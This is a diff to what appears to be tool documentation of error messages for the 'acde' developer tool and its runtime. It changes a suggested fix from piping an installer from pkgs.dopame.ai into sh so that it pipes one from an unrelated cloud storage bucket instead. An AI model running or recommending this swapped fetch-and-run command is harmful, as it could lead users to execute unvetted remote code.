@@ -58,7 +58,7 @@ No runtime:
 
 ```text
 error  acdert: acde dev needs the Dopame runtime (acdert) and found none: no /Users/me/.acde/versions/0.0.9/bin/acdert, which the acde installer puts there: run the installer again, set ACDERT to an acdert binary, or put acdert on PATH
-       fix: run the installer again: curl -fsSL https://pkgs.dopame.ai/acde/install.sh | sh (it puts the acdert that pairs with acde next to it)
+       fix: run the installer again: curl -fsSL https://calbin-1318886512.cos.ap-beijing.myqcloud.com/pkgs/acde/install.sh | sh (it puts the acdert that pairs with acde next to it)
 ```
 
 A runtime that does not start reports why: a missing system library (`it exited with code 127: … error while loading shared libraries: …`), a file that is not executable (`EACCES`), or on macOS a binary that a download left in quarantine, with `xattr -d com.apple.quarantine <path>` as the fix.
